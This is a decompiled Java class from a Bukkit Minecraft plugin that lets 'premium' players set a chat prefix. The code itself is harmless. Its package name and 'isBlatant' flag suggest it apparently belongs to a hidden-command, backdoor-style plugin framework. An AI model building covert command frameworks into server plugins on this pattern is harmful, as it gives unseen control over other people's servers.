/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.entity.Player;

public class SetprefixCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (args.length <= 1) {
                p2.sendMessage(Settings.USAGE("setprefix <prefix>"));
            } else {
                plugin.prefix.put(p2, args[1]);
                p2.sendMessage(Settings.PREFIX("Your new server chat prefix is " + Settings.RED + args[1]));
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be an " + Settings.RED + "premium " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

